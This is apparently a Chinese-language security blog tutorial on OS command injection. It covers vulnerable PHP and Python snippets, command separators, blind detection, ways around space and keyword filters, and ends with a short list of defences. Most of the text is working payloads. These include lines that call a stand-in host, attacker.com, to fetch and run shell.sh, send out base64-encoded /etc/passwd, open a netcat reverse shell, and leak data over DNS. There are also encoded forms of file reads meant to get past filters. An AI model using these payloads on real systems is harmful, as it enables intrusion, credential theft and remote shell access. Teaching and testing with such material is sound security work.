---
title: 命令注入基础与绕过空格过滤
date: 2026-01-15 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
---

## 前言

命令注入（Command Injection）是 Web 安全领域最常见的高危漏洞之一。攻击者通过在应用程序的输入点中注入操作系统命令，从而在服务器上执行任意指令。本文将从注入点识别、命令连接符、盲注检测到空格绕过技巧，系统性地梳理命令注入的基础知识。

> **免责声明：** 本文所有内容仅供安全研究与学习参考，请勿用于非法用途。未经授权对目标系统进行测试可能违反法律法规，由此产生的一切后果由行为人自行承担。

## 一、常见注入点

命令注入通常发生在应用程序调用系统命令并将用户输入作为参数传递时，开发者未对输入进行充分过滤或转义。

### 1.1 网络诊断类

最常见的注入点集中在网络诊断功能，这类功能往往直接调用系统级命令：

**Ping 功能**

许多网站提供在线 Ping 测试，后端代码可能类似于：

```php
// 不安全的写法
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

当 `ip` 参数未经过滤直接拼接到命令时，攻击者可以注入额外指令：

```bash
# 正常请求
GET /ping.php?ip=127.0.0.1

# 注入尝试
GET /ping.php?ip=127.0.0.1;id
GET /ping.php?ip=127.0.0.1|whoami
GET /ping.php?ip=127.0.0.1&&cat /etc/passwd
```

**Nslookup**

DNS 查询功能同样存在风险：

```python
# 典型危险代码
import os
domain = request.GET.get('domain')
os.system("nslookup " + domain)
```

注入示例：

```bash
# 正常：查询域名解析
domain=example.com

# 注入：执行额外命令
domain=example.com;ls -la
domain=example.com||whoami
domain=$(curl attacker.com/shell.sh | bash)
```

**Traceroute**

路由追踪功能也常被用作注入点：

```bash
# 注入示例
target=8.8.8.8;id
target=8.8.8.8|cat /etc/hosts
target=8.8.8.8&&uname -a
```

### 1.2 文件操作类

文件读取、写入、压缩、解压等功能也是注入高发区：

```php
// 文件压缩功能
$filename = $_POST['filename'];
system("zip backup.zip " . $filename);

// 文件读取
$file = $_GET['file'];
echo shell_exec("cat /var/www/uploads/" . $file);
```

注入尝试：

```bash
# 利用文件参数注入
filename=report.txt;rm -rf /tmp/*
filename=report.txt|curl http://attacker.com/$(cat /etc/passwd|base64)
filename=a.txt&&nc attacker.com 4444 -e /bin/bash
```

其他常见注入点还包括：邮件发送功能（sendmail）、日志查看、统计脚本、SSH 连接测试等。任何涉及系统调用的功能点都应重点关注。

## 二、命令连接符

理解每个连接符的行为差异，对漏洞利用至关重要。以下是 Linux/Unix 环境下常用的命令连接符：

### 2.1 基本连接符

| 符号 | 语法 | 行为说明 |
|------|------|----------|
| `;` | `cmd1;cmd2` | 顺序执行，无论 cmd1 是否成功都执行 cmd2 |
| `\|` | `cmd1\|cmd2` | 管道，将 cmd1 的标准输出作为 cmd2 的标准输入 |
| `\|\|` | `cmd1\|\|cmd2` | 逻辑或，cmd1 失败时才执行 cmd2 |
| `&` | `cmd1&cmd2` | 后台执行 cmd1，同时执行 cmd2 |
| `&&` | `cmd1&&cmd2` | 逻辑与，cmd1 成功时才执行 cmd2 |
| `` ` `` | `` `cmd` `` | 命令替换，执行内部命令并替换为输出结果 |
| `$()` | `$(cmd)` | 命令替换（现代写法，推荐） |

### 2.2 实战对比

假设在 Ping 功能中测试不同连接符：

```bash
# 1. 分号 - 无条件执行
127.0.0.1;id
# 结果：先执行 ping，再执行 id

# 2. 管道 - 将输出传递给后续命令
127.0.0.1|id
# 结果：ping 输出通过管道传给 id（id 忽略输入，仍正常执行）

# 3. 逻辑或 - ping 成功时 id 不执行
127.0.0.1||id
# 结果：ping 正常返回，id 不执行

# 4. 逻辑或 - 利用不存在的地址使 ping 失败
invalid||id
# 结果：ping 失败，触发 id 执行

# 5. 后台执行
127.0.0.1&id
# 结果：ping 放入后台，同时执行 id

# 6. 逻辑与 - ping 成功才执行
127.0.0.1&&id
# 结果：ping 成功，接着执行 id

# 7. 命令替换 (反引号)
`id`
# WAF 可能过滤 $ 但遗漏反引号

# 8. 命令替换 (现代语法)
$(id)
# 在支持的命令替换场景中直接执行
```

### 2.3 Windows 环境差异

在 Windows 命令提示符（cmd.exe）中：

```cmd
# & 和 && 行为与 Linux 类似
ping 127.0.0.1 & whoami
ping 127.0.0.1 && whoami

# | 管道也可用
ping 127.0.0.1 | whoami

# 但 ; 在 cmd.exe 中无效
```

PowerShell 环境下：

```powershell
;           # 分号同样用于分隔语句
|           # 管道
$(cmd)      # 子表达式
& { cmd }   # 脚本块调用
```

## 三、盲注命令注入检测

当命令执行结果无法直接回显到页面时，需要借助带外信道或时间延迟来确认漏洞。

### 3.1 时间延迟检测

通过注入 sleep 类命令，根据响应时间判断命令是否执行：

```bash
# Linux
127.0.0.1;sleep 5
127.0.0.1||sleep 10
127.0.0.1&&sleep 5

# ping 延迟（可替代 sleep，兼容更多环境）
127.0.0.1;ping -c 5 127.0.0.1

# Windows
127.0.0.1&ping -n 5 127.0.0.1
127.0.0.1&timeout /t 5
```

检测逻辑：正常请求响应时间为 100ms，注入 `sleep 5` 后响应延迟明显增加（接近 5000ms），可判定存在注入。

### 3.2 带外（Out-of-Band）检测

利用 DNS、HTTP 等外部信道将执行结果或确认信号传出：

**DNS 外带：**

```bash
# 基础 DNS 探测（确认命令执行）
nslookup $(whoami).attacker.com
ping -c 1 $(id).attacker.com

# 使用反引号绕过过滤
nslookup `whoami`.attacker.com

# 外带文件内容（注意 DNS 标签长度限制）
nslookup $(cat /etc/hostname|base32|tr -d '=').attacker.com
```

**HTTP 外带：**

```bash
# curl 外带
curl http://attacker.com/$(whoami)
curl http://attacker.com/?data=$(cat /etc/passwd|base64)

# wget 外带
wget http://attacker.com/$(id)

# nc 反弹（需要目标有 nc）
nc attacker.com 4444 -e /bin/bash
```

**Windows 环境下的外带：**

```cmd
# certutil
certutil -urlcache -split -f http://attacker.com/test.txt

# PowerShell
powershell -c "Invoke-WebRequest http://attacker.com/$(whoami)"
```

### 3.3 利用写文件检测

将命令输出写入 Web 可访问目录：

```bash
# 写入静态目录
id > /var/www/html/output.txt
cat /etc/passwd > /var/www/upload/result.txt
pwd > /tmp/out;cp /tmp/out /var/www/html/

# 确认文件可访问
curl http://target.com/output.txt
```

## 四、空格过滤绕过

空格是最常被过滤的字符之一。当 WAF 或应用层过滤去除空格时，以下技巧可以实现绕过。

### 4.1 IFS（内部域分隔符）

在 Bash 中，`$IFS` 默认包含空格、制表符和换行符，可以用作空格替代：

```bash
# 基本用法
cat${IFS}/etc/passwd
ls${IFS}-la

# 配合花括号（防止变量名粘连）
{cat,/etc/passwd}
{ls,-la,/tmp}

# IFS 配合制表符定义
IFS=$'\t'&&cat</etc/passwd
```

`$IFS$9` 技巧：`$9` 是一个空位置参数，附加在 IFS 后可以安全分隔后续字符，避免变量名粘连：

```bash
cat$IFS$9/etc/passwd
ls$IFS$9-al
```

### 4.2 制表符与 URL 编码

在 HTTP 请求中，可以使用 URL 编码字符替代空格：

| 编码 | 字符 | 说明 |
|------|------|------|
| `%09` | 制表符 (Tab) | 最常用的空格替代，兼容性好 |
| `%0a` | 换行符 (LF) | 可终止当前命令并开始新命令 |
| `%0d%0a` | 回车换行 (CRLF) | Windows 风格换行 |
| `%0b` | 垂直制表符 | 少数环境有效 |
| `%0c` | 换页符 | 少数环境有效 |

```bash
# GET 请求中使用 %09
GET /ping.php?ip=127.0.0.1%09%26%09id
# 实际执行：127.0.0.1 & id (制表符分隔)

# POST 请求中使用 %0a
POST /exec.php
cmd=cat%0a/etc/passwd
# 实际执行：cat\n/etc/passwd

# 混合使用
ip=127.0.0.1%0aid%0a|%0awhoami
```

`%0a` 换行注入的原理：换行符在 Bash 中可视为命令分割符/参数结束符。如果输入被直接拼接到命令行，换行可以断开原有命令上下文：

```bash
# 原始代码意图
system("echo Input: " . $input);

# 注入 input=%0aid%0a
# 实际执行的命令变成：
echo Input: 
id
# 换行后 id 成为独立的命令
```

### 4.3 花括号扩展

Bash 的花括号扩展机制可以不使用空格来构造命令和参数：

```bash
# 基础用法
{cat,/etc/passwd}
{ls,-la,/tmp}
{echo,test}

# 连续多个命令
{cat,/etc/passwd};{id};{whoami}
```

### 4.4 重定向符技巧

利用输入重定向也可以绕过空格限制：

```bash
# 使用 < 和 <> 读取文件
cat</etc/passwd
cat<>/etc/passwd

# 组合使用
id>output
cat<output
```

### 4.5 其他绕过方式

```bash
# 使用 X=$ 和 eval
X=$'cat\x20/etc/passwd'&&eval$X

# 使用 printf 构造空格
cat$(printf '\x20')/etc/passwd

# 使用环境变量
IFS=",";a=cat,/etc/passwd;$a

# 通配符与问号
/bin/c?t /etc/passwd
/???/c?t /???/???????
```

## 五、综合绕过示例

实际渗透中往往需要组合多种技术绕过 WAF：

**场景一：空格 + 分号被过滤**

```bash
# 使用 %0a 替代分号，%09 替代空格
GET /ping.php?ip=127.0.0.1%0awget%09http://attacker.com/shell.sh
```

**场景二：空格被过滤，目标为 Windows**

```cmd
# 使用 %0a 和制表符
ping%09-n%095%09127.0.0.1%0awhoami

# 使用 cmd.exe 的括号特性
cmd.exe%09/c%09(whoami)
```

**场景三：多关键字过滤**

```bash
# cat 被过滤 → 使用替代命令
more /etc/passwd
less /etc/passwd
tac /etc/passwd
head -n100 /etc/passwd
tail -n100 /etc/passwd
nl /etc/passwd
rev /etc/passwd|rev

# 使用 base64 编码绕过
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
# 解码后：cat /etc/passwd

# 使用十六进制
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"|bash

# 使用通配符绕过关键字
/bin/c?t /etc/passw?
/bin/c[a]t /etc/passwd
```

**场景四：利用环境变量混淆**

```bash
# PATH 变量中提取字符
echo ${PATH:0:1}           # 输出 /
${PATH:5:1}${PATH:14:1}    # 构造 cat

# 使用未定义的变量
$a /etc$u/passwd$u
```

## 六、防御措施简述

1. **避免直接调用系统命令** — 优先使用编程语言的 API 或库函数
2. **白名单校验** — 对输入值进行严格的白名单匹配
3. **参数化调用** — 使用参数数组而非字符串拼接（如 `execve`）
4. **转义特殊字符** — 至少转义 `;&|$()`{}<> 等元字符
5. **最小权限原则** — 应用进程以最低权限运行，限制可执行命令范围
6. **WAF 规则** — 在 WAF 层配置命令注入检测规则

## 参考

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)

---

*本文仅供安全研究与教学目的，请遵守当地法律法规。*
